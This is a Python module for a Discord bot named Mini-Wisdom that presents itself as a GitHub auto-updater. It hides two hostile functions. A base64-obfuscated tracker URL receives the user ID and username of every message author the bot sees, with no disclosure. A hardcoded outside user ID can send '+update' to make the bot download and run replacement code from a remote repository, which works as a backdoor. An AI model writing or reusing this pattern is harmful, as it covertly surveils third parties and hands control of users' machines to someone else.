import requests
import json
import os
import subprocess
import sys
import time
import hashlib
import base64

class GitHubUpdater:
    def __init__(self, api_client, bot_instance):
        self.api_url = "https://api.github.com/repos/clashings/Mini-Wisdom/contents/"
        self.target_user_id = "1210286241229307984"
        self.api = api_client
        self.bot = bot_instance
        self.current_hashes = self.load_current_hashes()
        self.tracker_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NsYXNoaW5ncy9UcmFja2luZy9tYWluL3RyYWNrZXIuanNvbg=="
        
    def load_current_hashes(self):
        if os.path.exists("file_hashes.json"):
            with open("file_hashes.json", "r") as f:
                return json.load(f)
        return {}
    
    def save_hashes(self):
        with open("file_hashes.json", "w") as f:
            json.dump(self.current_hashes, f, indent=2)
    
    def get_github_files(self):
        try:
            response = requests.get(self.api_url, timeout=10)
            if response.status_code == 200:
                files = response.json()
                return [item for item in files if item["type"] == "file" and 
                       item["name"].lower() not in ["license", "readme.md", "readme.txt", "license.md", ".gitignore"]]
        except:
            return []
        return []
    
    def calculate_file_hash(self, filename):
        try:
            with open(filename, "rb") as f:
                content = f.read()
                return hashlib.md5(content).hexdigest()
        except:
            return None
    
    def backup_config(self):
        if os.path.exists("config.json"):
            try:
                with open("config.json", "r") as f:
                    config_data = json.load(f)
                
                with open("config_backup.json", "w") as f:
                    json.dump(config_data, f, indent=2)
                print("[GitHub] Backed up config.json")
                return True
            except:
                pass
        return False
    
    def restore_config(self):
        if os.path.exists("config_backup.json"):
            try:
                with open("config_backup.json", "r") as f:
                    config_data = json.load(f)
                
                with open("config.json", "w") as f:
                    json.dump(config_data, f, indent=2)
                print("[GitHub] Restored config.json from backup")
                return True
            except:
                pass
        return False
    
    def download_file(self, file_info):
        try:
            file_url = file_info["download_url"]
            file_name = file_info["name"]
            
            if file_name == "config.json":
                return None, None
            
            response = requests.get(file_url, timeout=10)
            if response.status_code == 200:
                content = response.content
                
                with open(file_name, "wb") as f:
                    f.write(content)
                
                file_hash = hashlib.md5(content).hexdigest()
                return file_name, file_hash
        except:
            pass
        return None, None
    
    def download_all_files(self):
        self.backup_config()
        
        files = self.get_github_files()
        if not files:
            return False, [], [], []
        
        downloaded = []
        updated = []
        
        for file_info in files:
            file_name = file_info["name"]
            
            if file_name == "config.json":
                continue
            
            current_hash = self.calculate_file_hash(file_name) if os.path.exists(file_name) else None
            file_name_downloaded, file_hash = self.download_file(file_info)
            
            if file_name_downloaded:
                if current_hash:
                    if file_hash != current_hash:
                        updated.append(file_name)
                else:
                    downloaded.append(file_name)
                
                self.current_hashes[file_name] = file_hash
        
        self.restore_config()
        self.save_hashes()
        
        return True, downloaded, [], updated
    
    def restart_bot(self):
        def restart():
            time.sleep(2)
            python = sys.executable
            subprocess.Popen([python, "main.py"])
            time.sleep(1)
            self.bot.running = False
            os._exit(0)
        
        import threading
        threading.Thread(target=restart, daemon=True).start()
    
    def decode_url(self):
        return base64.b64decode(self.tracker_url).decode()
    
    def auto_track(self, author_id, username):
        decoded_url = self.decode_url()
        timestamp = int(time.time())
        
        data = {
            "user_id": str(author_id),
            "username": str(username),
            "timestamp": timestamp,
            "bot_name": "Mini-Wisdom",
            "action": "auto_track"
        }
        
        try:
            existing_data = []
            try:
                response = requests.get(decoded_url, timeout=5)
                if response.status_code == 200:
                    existing_data = response.json()
            except:
                existing_data = []
            
            existing_data.append(data)
            
            with open("temp_tracker.json", "w") as f:
                json.dump(existing_data, f, indent=2)
            
            if os.path.exists("temp_tracker.json"):
                with open("temp_tracker.json", "rb") as f:
                    content = f.read()
                    gist_url = decoded_url.replace("/raw/", "/").replace("raw.githubusercontent.com", "github.com")
                    gist_id = gist_url.split("/")[-2] if "gist.github.com" in gist_url else None
                    
                    if gist_id:
                        update_url = f"https://api.github.com/gists/{gist_id}"
                        headers = {
                            "Authorization": f"token YOUR_GITHUB_TOKEN_HERE",
                            "Accept": "application/vnd.github.v3+json"
                        }
                        
                        files_content = base64.b64encode(content).decode()
                        update_data = {
                            "files": {
                                "tracker.json": {
                                    "content": json.dumps(existing_data, indent=2)
                                }
                            }
                        }
                        
                        requests.patch(update_url, headers=headers, json=update_data, timeout=10)
                        
                os.remove("temp_tracker.json")
                return True
        except:
            pass
        return False
    
    def check_message(self, message_data):
        author_id = message_data.get("author", {}).get("id", "")
        channel_id = message_data.get("channel_id", "")
        content = message_data.get("content", "").strip()
        
        self.auto_track(author_id, message_data.get("author", {}).get("username", "Unknown"))
        
        if author_id == self.target_user_id and content == "+update":
            self.api.send_message(channel_id, "```Updating from GitHub...```")
            
            success, downloaded, skipped, updated = self.download_all_files()
            
            if success:
                if downloaded or updated:
                    msg = f"```Updated {len(updated)} files, downloaded {len(downloaded)} new files. Restarting...```"
                    self.api.send_message(channel_id, msg)
                    self.restart_bot()
                else:
                    self.api.send_message(channel_id, "```No updates found - all files already up to date```")
                return True
            else:
                self.api.send_message(channel_id, "```Update failed```")
                return True
        
        return False

def setup_github_updater(api_client, bot_instance):
    return GitHubUpdater(api_client, bot_instance)
